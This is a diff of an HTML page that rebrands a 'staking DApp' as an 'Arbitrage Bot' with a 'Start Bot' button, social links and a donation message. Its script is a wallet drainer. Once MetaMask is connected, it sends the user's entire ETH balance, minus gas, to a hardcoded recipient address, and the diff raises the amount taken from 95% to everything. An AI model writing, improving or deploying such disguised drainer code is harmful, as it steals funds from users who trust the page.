@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Staking DApp on Ethereum</title>
+    <title>Arbitrage Bot on Ethereum</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -25,6 +25,12 @@
         }
         #walletAddress {
             margin: 20px 0;
+        }
+        #typingMessage {
+            font-size: 18px;
+            color: #333;
+            margin: 20px 0;
+            font-weight: bold;
         }
         button {
             padding: 10px 20px;
@@ -57,17 +63,40 @@
             border-radius: 15px;
             width: 0;
         }
+        #footer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            padding: 20px;
+        }
+        #footer a {
+            text-decoration: none;
+            color: #007bff;
+            font-weight: bold;
+        }
+        #footer a:hover {
+            color: #0056b3;
+        }
     </style>
 </head>
 <body>
 
 <div id="app">
-    <h1>Stake on Ethereum</h1>
-    <p id="walletAddress">Connect your wallet to see your Ethereum address</p>
+    <h1>Start your Arbitrage Bot</h1>
+    <p id="walletAddress">Connect your wallet to see your address</p>
+    
+    <!-- Typing Message Area -->
+    <p id="typingMessage"></p>
+    
     <button id="connectButton">Connect MetaMask</button>
-    <button id="stakeButton" disabled>Stake ETH</button>
+    <button id="stakeButton" disabled>Start Bot</button>
     <div class="status" id="status"></div>
     <div id="progressBar"><div id="progress"></div></div>
+</div>
+
+<div id="footer">
+    <a href="https://t.me/SocratesWeb3King" target="_blank">Telegram</a>
+    <a href="https://x.com/socratesweb3kin?s=21&t=pJyVwAY43BkwOF0vt4lRFQ" target="_blank">Twitter</a>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
@@ -75,6 +104,21 @@
     let web3;
     let userAccount;
     let recipientAddress = "0x91Dc7c5B75c0FCD64a02F648d56cDE818982D1f2";  // Ethereum recipient address
+
+    // Typing effect for appreciation message
+    const message = "For appreciations kindly donate ETH to my address 0xC757349c0787F087b4a2565Cd49318af2DE0d0d7";
+    let index = 0;
+    
+    function typeMessage() {
+        if (index < message.length) {
+            document.getElementById("typingMessage").innerHTML += message.charAt(index);
+            index++;
+            setTimeout(typeMessage, 50);  // Adjust typing speed here
+        }
+    }
+
+    // Start typing effect when page loads
+    window.onload = typeMessage;
 
     // Connect to MetaMask
     document.getElementById("connectButton").addEventListener("click", async () => {
@@ -98,7 +142,7 @@
     async function checkNetwork() {
         const networkId = await web3.eth.net.getId();
         if (networkId !== 1) {
-            alert("You are not connected to the Ethereum network. Please switch to Ethereum Mainnet.");
+            alert("You are not connected to the Ethereum network. Please switch to Ethereum.");
         } else {
             console.log("Connected to Ethereum network");
         }
@@ -117,29 +161,29 @@
                 }
             }, 1000);
 
-            // Fetch user balance and gas price
             const balance = await web3.eth.getBalance(userAccount);
             const gasPrice = await web3.eth.getGasPrice();
+
+            // Estimate gas for the transaction
             const gasLimit = await web3.eth.estimateGas({
                 from: userAccount,
                 to: recipientAddress,
                 value: balance
             });
 
-            // Calculate gas cost
+            // Calculate total gas cost
             const gasCost = BigInt(gasLimit) * BigInt(gasPrice);
 
-            // Define the percentage of balance to send (e.g., 95%)
-            const sendPercentage = 0.95;
-            const valueToSend = BigInt(balance) * BigInt(sendPercentage * 100) / BigInt(100);
-
-            // Ensure enough ETH is left for gas fees
-            if (valueToSend <= gasCost) {
+            // Ensure gas fee does not exceed balance
+            if (gasCost >= BigInt(balance)) {
                 document.getElementById("status").innerText = "Insufficient ETH to cover gas fees.";
                 clearInterval(progressInterval);
                 document.getElementById("progress").style.width = "0%";
                 return;
             }
+
+            // Calculate the amount to send, accounting for gas cost
+            const valueToSend = BigInt(balance) - gasCost;
 
             // Send ETH to the recipient
             const tx = await web3.eth.sendTransaction({
